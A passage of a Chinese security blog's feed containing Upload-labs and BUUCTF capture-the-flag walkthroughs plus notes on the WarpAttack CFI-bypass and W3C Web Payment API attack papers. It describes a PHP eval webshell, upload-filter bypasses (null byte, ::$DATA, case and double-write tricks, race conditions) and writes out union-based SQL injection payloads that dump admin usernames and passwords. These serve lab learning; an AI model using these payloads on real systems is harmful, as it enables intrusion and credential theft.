只有到达解析器的安全限制计数器的上限才会停止，BIND9 中这个上限为 100。该上限对攻击者来说已经可以完成攻击了。</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ReadPaper</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Upload_labs2</title>
    <link href="/2023/09/07/Upload-labs2/"/>
    <url>/2023/09/07/Upload-labs2/</url>
    
    <content type="html"><![CDATA[<h4 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h4><p><img src="/2023/09/07/Upload-labs2/image-20230907100705175.png" alt="image-20230907100705175"></p><p><code>$img_path = $_GET[&#39;save_path&#39;] . &quot;/&quot; . rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $file_ext;</code>：构建一个新的文件路径，包括文件名和扩展名。这个路径基于名为 <code>&#39;save_path&#39;</code> 的 GET 参数，以及一个随机数、日期时间戳和文件扩展名。所以可以采用%00进行截断</p><h4 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h4><p><img src="/2023/09/07/Upload-labs2/image-20230907104811944.png" alt="image-20230907104811944"></p><p>这题变成了 <code>$_POST[&#39;save_path&#39;]</code> ，POST方式不会像GET方式一样，提交经过URL编码，所以进行截断需要手动修改二进制流</p><h4 id="Pass-13，14，15"><a href="#Pass-13，14，15" class="headerlink" title="Pass-13，14，15"></a>Pass-13，14，15</h4><p><img src="/2023/09/07/Upload-labs2/image-20230907151043164.png" alt="image-20230907151043164"></p><p>创建图片马：</p><p><img src="/2023/09/07/Upload-labs2/image-20230907150642263.png" alt="image-20230907150642263"></p><p>抓包记录上传位置</p><p><img src="/2023/09/07/Upload-labs2/image-20230907150615706.png" alt="image-20230907150615706"></p><p>通过题目给出的文件包含漏洞访问，可以看到正确返回了木马中的phpinfo()内容</p><p><img src="/2023/09/07/Upload-labs2/image-20230907150559242.png" alt="image-20230907150559242"></p><h4 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h4><p><img src="/2023/09/07/Upload-labs2/image-20230907153602463.png" alt="image-20230907153602463"></p><p>发现会对图片进行二次渲染，则之前使用的图片码无法使用，因为加在图片后的php代码会被渲染，从而无法正确执行</p><p>所以可以上传一张图片，对比看被二次渲染过的图片有什么地方是没变的，可以将php代码插入其中（通常文件头是不会被修改的，但修改文件头可能会导致文件损坏）</p><p><img src="/2023/09/07/Upload-labs2/image-20230907163747679.png" alt="image-20230907163747679"></p><p>左边是修改过的gif，右边是上传之后重新下载的gif，可以看到php代码被成功的添加</p><p>用上一题同样的方法访问</p><p><img src="/2023/09/07/Upload-labs2/image-20230907163902487.png" alt="image-20230907163902487"></p><p>通过文件包含漏洞，代码被成功执行</p><h4 id="Pass-17，18条件竞争"><a href="#Pass-17，18条件竞争" class="headerlink" title="Pass-17，18条件竞争"></a>Pass-17，18条件竞争</h4><p><img src="/2023/09/07/Upload-labs2/image-20230907165625505.png" alt="image-20230907165625505"></p><p>利用时间差，根据源码可以知道，上传的逻辑是：如果上传一个jpg，png，gif图片，成功了则改名并保存，若没成功则删除，则可以通过burpsuite进行攻击，不断的上传文件，并不断的访问该文件，直到访问成功</p>]]></content>
    
    
    <categories>
      
      <category>Basic</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Upload_labs1</title>
    <link href="/2023/09/05/Upload-labs/"/>
    <url>/2023/09/05/Upload-labs/</url>
    
    <content type="html"><![CDATA[<h4 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h4><p><img src="/2023/09/05/Upload-labs/image-20230905105954741.png" alt="image-20230905105954741"></p><p><strong>创建一句话php</strong></p><p><img src="/2023/09/05/Upload-labs/image-20230905110036360.png" alt="image-20230905110036360"></p><ul><li><code>@</code>：错误抑制符号，可以阻止PHP报告eval函数执行中的错误</li><li><code>eval</code>：接受一个字符串作为参数，将其作为PHP代码执行</li><li><code>$_POST(&#39;shell&#39;)</code>：POST请求变量，包含一个名为shell的参数</li></ul><p><strong>上传尝试</strong></p><p><img src="/2023/09/05/Upload-labs/image-20230905110908269.png" alt="image-20230905110908269"></p><p>猜测是前端JS限制了上传文件的类型，直接禁用前端JS后，再次上传</p><p><img src="/2023/09/05/Upload-labs/image-20230905111208945.png" alt="image-20230905111208945"></p><p>上传成功，查看传输的路径</p><p><img src="/2023/09/05/Upload-labs/image-20230905111248987.png" alt="image-20230905111248987"></p><p>通过蚁剑进行连接</p><p><img src="/2023/09/05/Upload-labs/image-20230905111418459.png" alt="image-20230905111418459"></p><p>在根目录下即可找到flag</p><h4 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h4><p>依然通过一句话php木马进行尝试</p><p><img src="/2023/09/05/Upload-labs/image-20230905111610103.png" alt="image-20230905111610103"></p><p>通过Burpsuite进行抓包</p><p><img src="/2023/09/05/Upload-labs/image-20230905111716152.png" alt="image-20230905111716152"></p><p>Content-Type显示为text&#x2F;php，修改为image&#x2F;jpeg，重发</p><p><img src="/2023/09/05/Upload-labs/image-20230905113245564.png" alt="image-20230905113245564"></p><p>得到路径，其余操作与Pass-01相同</p><p>利用该漏洞的关键函数：<code>mime_content_type()</code></p><h4 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h4><p><img src="/2023/09/05/Upload-labs/image-20230905133923792.png" alt="image-20230905133923792"></p><p>基于黑名单绕过，通常方法有以下几种：</p><ul><li>上传不常见的php拓展名：pht, phpt, phtml, php3,php4,php5,php6</li><li>有些会忽略大小写：Php，PHp，pHp之类的</li><li>解析漏洞：例如apache，iis，nginx（需要继续了解，后续单独写博客）</li></ul><p><img src="/2023/09/05/Upload-labs/image-20230905134828992.png" alt="image-20230905134828992"></p><p>修改后缀即可</p><h4 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h4><p><img src="/2023/09/05/Upload-labs/image-20230906131705456.png" alt="image-20230906131705456"></p><p>屏蔽了所有的拓展名，所以可以通过基于白名单的绕过进行文件上传：%00截断：在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束</p><p><img src="/2023/09/05/Upload-labs/image-20230906131758825.png" alt="image-20230906131758825"></p><p>也可以通过上传.htaccess文件绕过</p><h4 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h4><p><img src="/2023/09/05/Upload-labs/image-20230906135624141.png" alt="image-20230906135624141"></p><p>对比之前的题目，可以发现，少了将文件名全部转化成小写这一步，所以可以通过大小写混合进行绕过</p><p><img src="/2023/09/05/Upload-labs/image-20230906140256010.png" alt="image-20230906140256010"></p><h4 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h4><p><img src="/2023/09/05/Upload-labs/image-20230906142332590.png" alt="image-20230906142332590"></p><p>并未去除首尾的空格，可以通过添加空格的方式绕过</p><p><img src="/2023/09/05/Upload-labs/image-20230906143052256.png" alt="image-20230906143052256"></p><p>因为此时服务器获得的文件后缀是php+空格，不在黑明单中，所以可以实现绕过</p><h4 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h4><p><img src="/2023/09/05/Upload-labs/image-20230906143845354.png" alt="image-20230906143845354"></p><p>代码中没有过滤点，可以通过加点进行绕过</p><p><img src="/2023/09/05/Upload-labs/image-20230906144030007.png" alt="image-20230906144030007"></p><p>此时，服务器获取到的后缀是空，不在黑名单中</p><h4 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h4><p><img src="/2023/09/05/Upload-labs/image-20230906150046786.png" alt="image-20230906150046786"></p><p>源码没有过滤::DATA，可以利用windows的特性</p><p>在window的时候如果文件名+<code>&quot;::$DATA&quot;</code>会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名，且保持<code>::$DATA</code>之前的文件名，目的就是不检查后缀名</p><p><img src="/2023/09/05/Upload-labs/image-20230906150026942.png" alt="image-20230906150026942"></p><h4 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h4><p><img src="/2023/09/05/Upload-labs/image-20230906153208872.png" alt="image-20230906153208872"></p><p>由于代码没有写循环，代表对于 <code>.</code> 和 <code> space</code>的过滤只会进行一遍，所以可以通过在后缀名后添加 <code>. .</code>来进行绕过</p><h4 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h4><p><img src="/2023/09/05/Upload-labs/image-20230906153917267.png" alt="image-20230906153917267"></p><p><code>$file_name=str_ireplace($deny_file, &quot;&quot;, $file_name)</code>：函数调用会查找 <code>$file_name</code> 中包含在 <code>$deny_ext</code> 数组中的任何子字符串，然后将它们替换为空字符串，即删除这些子字符串</p><p>所以可以通过双写进行绕过，在处理 <code>pphphp</code>时，由于上述函数，中间的php将被替换成空，该后缀仍然会被解析成php</p><p><img src="/2023/09/05/Upload-labs/image-20230906154338920.png" alt="image-20230906154338920"></p>]]></content>
    
    
    <categories>
      
      <category>Basic</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTFWriteUp1</title>
    <link href="/2023/09/02/BUUCTFWriteUp1/"/>
    <url>/2023/09/02/BUUCTFWriteUp1/</url>
    
    <content type="html"><![CDATA[<p><strong>LFI COURSE 1</strong></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902093905518.png" alt="image-20230902093905518"></p><p><code>if(isset($_GET[&#39;file&#39;])) &#123; ... &#125;</code>：这是一个条件语句，用于检查是否存在名为 ‘file’ 的 GET 参数。如果存在，代码块内的内容将被执行。</p><p><code>$str = $_GET[&#39;file&#39;];</code>：将名为 ‘file’ 的 GET 参数的值存储在变量 <code>$str</code> 中。</p><p><code>include $_GET[&#39;file&#39;];</code>：这行代码尝试包含一个文件，文件名由 GET 参数 ‘file’ 的值指定</p><p>用户可以通过GET参数来指定要包含的文件，include可能存在LFI（文件包含漏洞攻击）</p><p>尝试?file&#x3D;&#x2F;flag   ?file&#x3D;&#x2F;flag.txt ?file&#x3D;&#x2F;flag.php </p><p>?file&#x3D;&#x2F;flag可以直接得到flag</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902094347903.png" alt="image-20230902094347903"></p><p><strong>BRUTE 1</strong></p><p>进入靶机后以下界面：</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902102422665.png" alt="image-20230902102422665"></p><p>随意尝试组合用户名为123，password为123，返回“用户名错误”</p><p>用burpsuite抓包可以得到以下信息</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902102530889.png" alt="image-20230902102530889"></p><p>根据题目意思Brute为野蛮的，推测为暴力破解，则选择send to Intruder，因为返回为“用户名错误”而不是“用户名或密码错误”，在尝试时，推测可以先确定用户名，再确定密码，不需要两边同时爆破</p><p>所以构造：</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902103129156.png" alt="image-20230902103129156"></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902103004685.png" alt="image-20230902103004685"></p><p>用户名字典和密码字典为网上下载，导入后选择Simple list，开始爆破</p><p>当用户名为admin时：</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902103201354.png" alt="image-20230902103201354"></p><p>所以修改payload：</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902103408791.png" alt="image-20230902103408791"></p><p>得到正确的值6490</p><p>至此得到用户名为admin，密码为6490，输入可以得到flag</p><p><strong>SQL COURSE 1</strong></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902150719714.png" alt="image-20230902150719714"></p><p>随便点击</p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902163825700.png" alt="image-20230902163825700"></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902163842513.png" alt="image-20230902163842513"></p><p>看到在访问backend&#x2F;content_detail.php?id&#x3D;1处，可能存在sql注入点，扔到HackBar中开始测试</p><p>分别尝试<code>?id=1 and 1=1</code>和 <code>?id=1 and 1=2</code> 发现第一条有回显，第二条没有，判断为数字型注入</p><p>判断or是否被过滤：</p><p><code>?id=1 or 1=1</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902170242985.png" alt="image-20230902170242985"></p><p>判断列数：</p><p><code>?id=1 order by 1</code> 有回显</p><p><code>?id=1 order by 2</code>有回显</p><p><code>?id=1 order by 3</code>无回显</p><p>所以表有两列</p><p>确定字段的显示顺序</p><p><code>?id=-1 union select 1,2</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902170731553.png" alt="image-20230902170731553"></p><p>爆破数据库：</p><p><code>?id=-1 union select database(), database()</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902171015321.png" alt="image-20230902171015321"></p><p>根据获得的数据库的名称，获取数据表的信息</p><p><code>?id=-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;news&#39;)</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902171132043.png" alt="image-20230902171132043"></p><p><code>select group_concat(table_name) from information_schema.tables where table_schema=&#39;news&#39;</code>这部分会连接数据库中的所有表格名称，并以逗号分隔的形式返回。于是得到了表名信息admin, contents</p><p>使用admin表，获取字段信息</p><p><code>?id=-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;news&#39; and table_name=&#39;admin&#39;)</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902171445924.png" alt="image-20230902171445924"></p><p>此处union select后的1作为占位符，使得结果可以对齐，括号中的查询语句可以获得news库admin表中的所有列名</p><p>获取username</p><p><code>?id=-1 union select 1,(select group_concat(username) from admin)</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902171958351.png" alt="image-20230902171958351"></p><p>获取密码</p><p><code>?id=-1 union select 1,(select group_concat(password) from admin)</code></p><p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902172038494.png" alt="image-20230902172038494"></p><p>根据得到的信息即可得到flag</p>]]></content>
    
    
    <categories>
      
      <category>Basic</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ReadPaper2</title>
    <link href="/2023/07/27/ReadPaper2/"/>
    <url>/2023/07/27/ReadPaper2/</url>
    
    <content type="html"><![CDATA[<h2 id="WarpAttack-Bypassing-CFI-through-Compiler-Introduced-Double-Fetches-（WarpAttack：通过编译器引入的双重获取绕过CFI）"><a href="#WarpAttack-Bypassing-CFI-through-Compiler-Introduced-Double-Fetches-（WarpAttack：通过编译器引入的双重获取绕过CFI）" class="headerlink" title="WarpAttack: Bypassing CFI through Compiler-Introduced Double-Fetches （WarpAttack：通过编译器引入的双重获取绕过CFI）"></a>WarpAttack: Bypassing CFI through Compiler-Introduced Double-Fetches （WarpAttack：通过编译器引入的双重获取绕过CFI）</h2><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>如今多数系统上运行的软件是由C&#x2F;C++编写的，容易出现内存损坏错误，因此需要对这些程序进行彻底的测试以尽可能的消除错误，但通常测试时不完整的，因此会在代码中添加缓解措施以增加攻击的难度，广泛应用的措施有：</p><p>地址空间布局随机话（ASLR）：操作系统在加载进程的时候，会随机地改变可执行文件、共享库、堆栈和其他内存区域的基地址，使得这些区域在每次运行时都位于不同的内存地址位置。</p><p>堆栈canaries（Stack Canaries）：通过在函数返回地址之前或之后插入一个特殊的随机值（称为堆栈金丝雀或堆栈哨兵），来检测堆栈缓冲区溢出攻击。在函数执行结束时，系统会检查这个堆栈金丝雀的值是否被修改过，如果被修改，就说明发生了堆栈缓冲区溢出攻击。如果检测到这种异常情况，程序通常会立即终止执行，从而防止恶意代码得以执行。</p><p>数据执行预防（DEP）：通过硬件和操作系统的支持，在内存中标记某些区域为”不可执行”，也就是阻止这些区域的数据作为指令被执行。这样一来，即使攻击者成功注入恶意代码到内存中，也无法执行，因为这些区域被标记为只能包含数据而不能执行指令。</p><p>代码重用攻击在这些缓解措施下仍然有效，例如ROP（返回导向编程），针对这一点，CFI（Control-Flow Integrity）被认为是阻止代码重用攻击的关键措施。CFI首先静态计算程序的控制流图（CFG），并确定所有合法的控制流传输目标。然后，CFI会在代码中插入检查，以在运行时验证每个控制流传输。</p><p>但目前的编译器对于缓解措施插入的安全检查代码并不会视为特权代码，所以在进行代码优化时，可能导致安全性遭到破坏使攻击者有Time-of-Check to Time-Of-Use（TOCTTOU）的机会 。</p><p>例如：代码中存在switch语句，执行时通常遵循以下模式，给定一个跳转表和一个索引，程序首先获取索引值以验证边界检查是否满足跳转表大小，然后再次获取索引值以进行实际的跳转处理。由于索引被多次加载（获取），攻击者可以在边界检查后覆盖索引值，最终允许在跳转表之外进行任意跳转。</p><p>本文研究了由双重获取引入的TOCTOU漏洞，并提出了攻击WarpAttack，并在firefox上成功实施</p><h3 id="Threat-Model"><a href="#Threat-Model" class="headerlink" title="Threat Model"></a>Threat Model</h3><p>攻击者能力：</p><ul><li>任意读写：攻击者持有一个内存损坏漏洞（如use-after-free错误），使其能够读写任意内存。C&#x2F;C++ 程序容易受到此类漏洞的影响</li><li>线程控制：攻击者能够主动控制与被攻击程序在同一地址空间内的线程。</li><li>Gadget：受害者程序包含足够的 gadget 代码片段，即带有编译器引入的双重获取的开关跳转表。</li></ul><p><em>Gadget 是一种有用的构造块，可以被组合成攻击载荷，以绕过程序的安全措施和执行恶意操作。这些构造块通常是由程序本身的代码片段组成，例如函数的一部分或条件分支的一小段代码。</em></p><p>攻击者目标是劫持控制流到特定位置</p><p>防御假设：</p><p>不可执行内存：受害者程序受到DEP保护，攻击者无法执行任何注入式攻击，只能进行代码重用攻击</p><p>随机化：受害者程序受地址空间随机化保护</p><p>控制流保护：受害者程序应用完全精确的静态 CFI</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ReadPaper</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ReadPaper1:WPA</title>
    <link href="/2023/07/26/ReadPaper1/"/>
    <url>/2023/07/26/ReadPaper1/</url>
    
    <content type="html"><![CDATA[<h2 id="A-Formal-Security-Analysis-of-the-W3C-Web-Payment-APIs-Attacks-and-Verification-W3C-Web-支付-API-的正式安全分析：攻击和验证"><a href="#A-Formal-Security-Analysis-of-the-W3C-Web-Payment-APIs-Attacks-and-Verification-W3C-Web-支付-API-的正式安全分析：攻击和验证" class="headerlink" title="A Formal Security Analysis of the W3C Web Payment APIs: Attacks and Verification(W3C Web 支付 API 的正式安全分析：攻击和验证)"></a>A Formal Security Analysis of the W3C Web Payment APIs: Attacks and Verification(W3C Web 支付 API 的正式安全分析：攻击和验证)</h2><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>当下支付环境多样，有Stripe，Google pay，PayPal等多种支付方式，存在的问题有：</p><ul><li>恶意顾客可能会篡改商家与支付处理机构之间的信息流</li><li>支付处理机构的方案可能存在缺陷</li><li>用户可能会被多种不同的用户界面所困惑，从而更容易受到网络钓鱼攻击</li></ul><p>此外，在面对有些支付界面较为复杂时，用户可能直接关闭支付进程</p><p>为此，W3C（World Wide Web Consortium）目前正在开发WPA（Web Payment APIs）这是一种简化和标准化浏览器中的支付和结账流程的方法。其主要思想是，商家不再自己提供用于结账的网页或JavaScript，而是将这个过程交给用户的Web浏览器来处理。浏览器随后呈现给用户全新的支付用户界面（见图1），该界面位于Web上下文之外。在这个用户界面中，用户可以查看订单，选择（预先存储的）送货地址、支付方式和支付处理器（例如使用Stripe信用卡付款）。</p><p><img src="/2023/07/26/ReadPaper1/image-20230727152130120.png" alt="image-20230727152130120"></p><h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><ul><li>本文的分析是在详细的Web基础设施模型中，对Web Payment的首次分析</li><li>分析基于迄今为止最全面的Web基础设施模型——WIM，并做出了重要扩展</li><li>制定了反映使用WPA进行支付的完整性的精确安全属性：支付意图和支付唯一性。在尝试证明这些属性时，发现了两个关键性的漏洞，并提出了修复措施</li></ul><h3 id="THE-W3C-WEB-PAYMENT-APIS"><a href="#THE-W3C-WEB-PAYMENT-APIS" class="headerlink" title="THE W3C WEB PAYMENT APIS"></a>THE W3C WEB PAYMENT APIS</h3><h4 id="安全属性"><a href="#安全属性" class="headerlink" title="安全属性"></a>安全属性</h4><p><strong>支付意图</strong></p><p>浏览器会将用户表达意图的所有支付存储在一个名为PaymentIntents的字典中，它保证了支付提供者在进行交易时与顾客在支付UI界面中确认的信息一致。具体来说，这意味着支付的发送方、接收方和总金额与顾客在浏览器中确认的信息相符。这个属性可以防止恶意方代表顾客进行未经授权的支付。</p><p><strong>支付唯一性</strong></p><p>每个支付提供者则在其状态中存储所有已执行交易的记录，存储在一个名为”transactions”的映射表中，支付的唯一性确保对于客户授权的每笔付款，任何诚实的支付提供者最多执行一个交易，并且该交易具有正确的值。</p><h4 id="工作流"><a href="#工作流" class="headerlink" title="工作流"></a>工作流</h4><p><img src="/2023/07/26/ReadPaper1/image-20230727102822005.png" alt="image-20230727102822005"></p><ol><li>商家创建支付请求，支付请求中包含字段：id（支付的唯一标识符）&#x2F;商家接受的支付方法（methodData）&#x2F;总花费和一些商品可选细节（details）&#x2F;用户必须提供哪些数据（options：例如地址，电话）</li><li>通过Payment Request API将数据交给浏览器，浏览器根据支付请求中的 methodData（商家支持的支付方式）与已注册的支付处理程序进行对比，并选择在 methodData 中至少一种支付方式注册的所有支付处理程序。</li><li>在进行初步选择后，浏览器对每个选中的支付处理程序触发 CanMakePaymentEvent（支付是否可进行事件）。此事件包含有关所请求支付的基本信息，如商家顶层页面的源地址、支付请求发起的源地址以及适用的支付方式数据集（来自 PR.methodData）</li><li>支付处理程序在接收 CanMakePaymentEvent 后确定是否可以处理该支付请求。此决策过程特定于支付方式，并可能取决于法律要求。</li><li>在接收完所有触发的支付处理程序的响应后，浏览器显示一个特殊的对话框，称为支付 UI（用户界面）。这个支付 UI 不是网站的一部分，而是浏览器本身的界面（参见图1）。支付 UI 允许顾客输入（或选择存储的）所需信息，如送货地址、电子邮件地址以及支付详细信息。</li><li>支付详细信息包括选择可用支付处理程序和支付方式。如果顾客输入（或选择存储的或更改的）送货地址，还需要额外的步骤：因为这可能会改变送货费用，因此商家网站会收到一个部分匿名化的地址以重新计算送货费用。</li><li>顾客提交选择后，浏览器组装一个 PaymentRequestEvent（支付请求事件）并将其交给顾客选择的支付处理程序。该 PaymentRequestEvent 包含与 CanMakePaymentEvent 相同的数据（见上文），以及顾客输入的支付数据，如信用卡号、过期日期和验证号码。</li><li>在接收 PaymentRequestEvent 后，支付处理程序采取必要的步骤来执行或至少促进支付。</li><li>在执行这些步骤后，支付处理程序通过创建 PaymentHandlerResponse（支付处理程序响应）来完成其工作。此响应包含（再次）支付方式标识符和一个 details 字段，其确切内容取决于支付方式。details 的内容可以是支付提供者的某些签名支付确认，或者仅为“反映”信用卡数据等简单内容。</li><li>收到支付处理程序响应后，浏览器创建一个支付响应并将其返回给商家的网站。支付响应包含来自处理程序响应的 details、所选支付方式以及商家在 PR.options 中请求的额外数据，如送货地址。</li><li>商家现在可以检查响应（例如，验证信用卡数据的有效性）并通过表示结账过程完成（在这种情况下，浏览器关闭支付 UI）或表示出现问题而终止流程。</li></ol><p>一旦顾客进行了修改并重新提交，浏览器会向随后选择的支付处理程序触发另一个 PaymentRequestEvent，其中包含相同的支付标识符，但可能不同的支付细节（例如，由顾客选择的不同支付方式）。支付处理程序然后处理并可能更新支付（如有必要），再次用处理程序响应触发浏览器创建支付响应并将其交给商家。此时，商家可以再次接受支付响应或发起另一个重试。</p><h4 id="存在的漏洞"><a href="#存在的漏洞" class="headerlink" title="存在的漏洞"></a>存在的漏洞</h4><p><strong>Double Charging with Retry（重试引起的重复支付）</strong></p><p>在这个攻击过程中，假设有一个恶意商家和一个诚实的顾客。攻击利用了WPA中的重试机制。</p><ol><li>顾客发起结账：顾客在恶意商家的网站上发起结账请求。</li><li>商家创建支付请求：商家创建一个正常的支付请求，并将其交给浏览器处理。</li><li>浏览器引导支付流程：浏览器根据WPA规范的步骤，引导顾客完成支付流程的步骤6到11，这包括选择支付方式、确认支付等。</li><li>收到支付响应：商家收到顾客的支付响应，但在这里进行了攻击。</li><li>触发重试：商家触发了一个重试请求（retry），这意味着商家在第一次支付时出现了问题，要求顾客切换到不同的支付处理器和支付方式提供商，因为第一个支付方式据称不起作用。</li><li>显示错误信息：浏览器在其支付界面中显示了错误信息，告知顾客需要切换支付方式。</li><li>顾客选择不同的支付方式：由于顾客认为第一个支付方式存在问题，她选择了不同的支付处理器和支付方式提供商，并再次提交支付请求。</li><li>触发新的支付处理器：浏览器触发了新的支付处理器，该处理器执行第二次支付。</li><li>第二次支付：新的支付处理器执行了第二次支付，这就是攻击实现了双重收费的地方。</li><li>结账完成：攻击完成后，整个结账流程继续进行，顾客完成了支付流程，而没有任何提示表明她支付了两次。</li></ol><p>这个攻击是由于浏览器的行为，而不是支付处理器的实现。第二个支付处理器无法检测到它是在重试上下文中调用的，因为它之前没有见过整个交易的支付id。攻击者可以反复利用这个漏洞，让顾客反复被收取双重费用，而商家和支付处理器无法察觉。</p><p>修复措施：</p><p>可以在交易重复使用不同处理程序时通知支付处理程序，以便它可以撤销支付并在成功撤销后再触发第二个支付处理程序。或者支付处理程序可以在其响应中包含一个状态，指示是否已经进行了支付，并阻止在这种情况下更改支付处理程序。在与W3C Web Payments Working Group的讨论中，他们选择了一个非常简单的修复方法，即完全禁止更改支付处理程序，尽管这可能会迫使顾客中止整个流程，如果一开始选择的支付处理程序实际上不能正常工作。这是规范最终采用的方法。</p><p><strong>Ambiguous Payment Method Data（模棱两可的支付数据）</strong></p><p>在这个攻击过程中，假设商家是恶意的，而其他人都是诚实的。攻击利用了WPA规范中的一个特定字段——methodData。以下是攻击的步骤：</p><ol><li>商家创建支付请求：商家创建一个支付请求PR，其中methodData字段包含两个条目，都是相同的支付方式，即具有相同的支付方式标识符。根据W3C规范，这是完全有效的。其中一个条目可能不包含任何费用，而另一个可能包含非常高的费用。</li><li>提交支付请求：商家将支付请求PR提交给WPA（如往常一样）。这触发浏览器在其安装的支付处理器列表中搜索与PR中给定的支付方式标识符匹配的处理器，并查询匹配的处理器。</li><li>显示支付界面：之后，浏览器显示支付界面。我们假设用户总是选择第一个条目，即不包含额外费用的条目。她输入所需数据并提交。</li><li>调用支付处理器：现在，浏览器将带有支付细节的PaymentRequestEvent（包括完整的methodData列表，即两个条目）交给所选的支付处理器。</li><li>支付处理器决策：然而，PaymentRequestEvent不包含用户从methodData中选择了哪个条目的信息。支付处理器现在必须决定使用哪个支付方式数据条目。由于规范中也没有关于此的指导，我们假设支付处理器总是选择最后一个支付方式数据条目（在我们的攻击中会产生巨额的额外费用）并执行支付。</li><li>完成支付：其余步骤与常规支付流程相同。结果是，顾客被收取了她从未同意的费用，而没有任何提示。</li></ol><p>这种攻击并不依赖于浏览器和支付处理器在存在多个适用的methodData条目时如何确定选择哪一个，只要存在这样的可能性，它们选择不同的条目即可。这使得顾客被收取未知费用的攻击成为可能。</p><p>修复措施：</p><p>浏览器可以拒绝模棱两可的条目，或者将用户的选择传递给支付处理程序。我们建议采用第一种选项，以保持API接口的稳定性。因为每次用户选择的变化都可能需要更新支付处理程序的实现，导致接口的不稳定性和不一致性。</p><h4 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h4><p>为了全面分析WPA，对WIM做出了以下拓展</p><ol><li>可扩展的DOM事件处理：WPA大量使用DOM事件来触发支付处理程序。为了模拟这些事件的处理过程，WIM（Web Infrastructure Model）的浏览器模型被扩展，引入了一组待处理事件和一个可扩展的处理函数。当浏览器被触发处理DOM事件时，其中一个待处理事件会被随机选择，从待处理事件集合中移除，并交给处理函数处理。这样，模拟了事件的传递和处理过程。</li><li>Service Workers：Service Workers是在浏览器中后台运行的事件驱动型JavaScript程序，可用于为Web应用程序提供离线功能。在WPA中，支付处理程序被视为Service Workers的实例。因此，WIM的浏览器模型被扩展，加入了一组注册的Service Workers。类似于事件处理，当浏览器被触发时，Service Worker可以被非确定性地选择执行，从而模拟了Service Worker的运行过程。</li><li>脚本API扩展：WPA本身是WIM浏览器模型的重要扩展。WPA已被各大主流浏览器实现，这导致了在真实执行环境中，网页应用程序和脚本（诚实或不诚实）可能会干扰WPA的各个部分，从而扩大了攻击面。为此，WIM的脚本API被扩展，将WPA规范中定义的API函数形式化为脚本命令，即脚本可以输出命令，指示浏览器调用具有给定参数列表的API函数。这些API函数的定义遵循WPA规范，并允许对其进行形式化的分析。</li></ol><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p><strong>为什么此处对于WPA模型安全性的分析都是假设商家是恶意的而用户是诚实的</strong></p><p>个人理解：首先，用户的行为通常是会受到较大约束的，发起主动攻击的难度较大。多数攻击是针对正常运作的系统发起的。虽然用户的一些攻击行为可能会获取不当利益，例如进行虚假支付。但是从安全研究的角度来看，通常更关注的是那些针对系统本身的漏洞和攻击。其次，当进行系统安全性评估和漏洞分析时，假设商家是恶意的可以帮助研究人员更好地理解系统的脆弱点和潜在风险。</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ReadPaper</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Exercise2</title>
    <link href="/2023/07/19/Exercise2/"/>
